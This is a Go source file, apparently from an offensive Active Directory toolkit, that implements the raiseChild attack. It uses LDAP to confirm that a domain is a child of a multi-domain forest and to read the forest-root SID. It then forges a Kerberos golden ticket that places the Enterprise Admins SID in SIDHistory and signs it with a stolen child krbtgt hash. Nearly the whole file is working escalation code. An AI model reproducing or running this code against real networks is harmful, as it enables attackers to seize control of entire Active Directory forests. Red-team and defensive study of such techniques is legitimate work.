package smbclient

import (
	"fmt"
	"strings"

	"github.com/mandiant/gopacket/pkg/security"

	"anvil/internal/ticket"
)

// RaiseChildInfo describes the session's domain/forest posture for the
// raiseChild attack (child -> forest root escalation via SIDHistory). The
// attack's precondition is that the session's domain is a CHILD of a
// multi-domain forest: only then is there a forest root to raise to.
type RaiseChildInfo struct {
	DomainFQDN string // DNS name of the session's domain
	DomainSID  string // domain SID of the session's domain
	ForestFQDN string // DNS name of the forest-root domain
	ForestSID  string // forest-root domain SID (resolved only when IsChild)
	IsChild    bool   // true when the session's domain is a child of the forest root
}

// RaiseChildCheck probes the domain/forest posture behind the session. One
// transient LDAP channel (RootDSE + domain head; plus the trust objects when
// the domain turns out to be a child).
//
// Child detection: the RootDSE's defaultNamingContext is THIS domain's DN,
// rootDomainNamingContext the forest root's — they differ exactly when the
// domain is a child. The forest-root SID (for the Enterprise Admins extra
// SID, <rootSID>-519) comes from the within-forest trustedDomain object the
// child holds for its parent: its securityIdentifier attribute carries the
// parent domain SID, so no channel to a parent DC is needed (gopacket's
// tools/raiseChild instead queries the parent DC over LSARPC).
func (s *Session) RaiseChildCheck() (*RaiseChildInfo, error) {
	cl, cleanup, err := s.openLDAP()
	if err != nil {
		return nil, err
	}
	defer cleanup()

	res, err := cl.SearchBase("", "(objectClass=*)", []string{"defaultNamingContext", "rootDomainNamingContext"})
	if err != nil {
		return nil, fmt.Errorf("rootDSE: %v", err)
	}
	if len(res.Entries) == 0 {
		return nil, fmt.Errorf("rootDSE: no entry returned")
	}
	domainNC := res.Entries[0].GetAttributeValue("defaultNamingContext")
	rootNC := res.Entries[0].GetAttributeValue("rootDomainNamingContext")
	if domainNC == "" || rootNC == "" {
		return nil, fmt.Errorf("rootDSE: naming contexts missing (defaultNamingContext=%q rootDomainNamingContext=%q)", domainNC, rootNC)
	}

	info := &RaiseChildInfo{
		DomainFQDN: dnToDomain(domainNC),
		ForestFQDN: dnToDomain(rootNC),
		IsChild:    !strings.EqualFold(domainNC, rootNC),
	}

	// Domain SID from the domain NC head object's objectSid.
	domRes, err := cl.SearchBase(domainNC, "(objectClass=*)", []string{"objectSid"})
	if err != nil {
		return nil, fmt.Errorf("domain head: %v", err)
	}
	if len(domRes.Entries) > 0 {
		if raw := domRes.Entries[0].GetRawAttributeValue("objectSid"); len(raw) > 0 {
			sid, _, err := security.ParseSIDBytes(raw)
			if err != nil {
				return nil, fmt.Errorf("parse domain SID: %v", err)
			}
			info.DomainSID = sid.String()
		}
	}

	if !info.IsChild {
		return info, nil
	}

	// Child domain: find the within-forest trust to the parent. trustedDomain
	// objects live under CN=System of the domain NC; trustPartner is the
	// trusted domain's DNS name, securityIdentifier its domain SID.
	tRes, err := cl.Search("CN=System,"+domainNC, "(objectClass=trustedDomain)",
		[]string{"trustPartner", "securityIdentifier"})
	if err != nil {
		return nil, fmt.Errorf("trust search: %v", err)
	}
	for _, entry := range tRes.Entries {
		if !strings.EqualFold(entry.GetAttributeValue("trustPartner"), info.ForestFQDN) {
			continue
		}
		raw := entry.GetRawAttributeValue("securityIdentifier")
		if len(raw) == 0 {
			continue
		}
		sid, _, err := security.ParseSIDBytes(raw)
		if err != nil {
			continue
		}
		info.ForestSID = sid.String()
	}
	if info.ForestSID == "" {
		return nil, fmt.Errorf("no within-forest trust to %s found — cannot derive the forest-root SID", info.ForestFQDN)
	}
	return info, nil
}

// RaiseChild verifies the child-domain precondition and, when it holds,
// forges the raiseChild golden ticket: child realm + child domain SID, the
// forest-root Enterprise Admins SID in SIDHistory, signed with the CHILD
// krbtgt NT hash (recovered beforehand, e.g. via dcsync of the child).
// Returns the ccache path written. The forge itself is offline; the
// precondition check uses one transient LDAP channel.
//
// The impersonated account is Administrator (RID 500), the canonical
// raiseChild target — resolving the actual parent-domain RID-500 name would
// need a channel to a parent DC, which the offline forge deliberately avoids.
//
// In a single-domain forest the session's domain IS the forest root; there
// is no parent to raise to and the attack does not apply — reported as a
// plain error, not a forge.
func (s *Session) RaiseChild(childKrbtgtHash, out string) (string, error) {
	info, err := s.RaiseChildCheck()
	if err != nil {
		return "", err
	}
	if !info.IsChild {
		return "", fmt.Errorf("%s is the forest root, not a child domain — raiseChild needs a child domain of a multi-domain forest", info.DomainFQDN)
	}
	return ticket.ForgeChild(ticket.ChildOptions{
		User:            "Administrator",
		ChildDomain:     info.DomainFQDN,
		ChildDomainSID:  info.DomainSID,
		ParentDomainSID: info.ForestSID,
		KrbtgtHash:      childKrbtgtHash,
		Out:             out,
	})
}
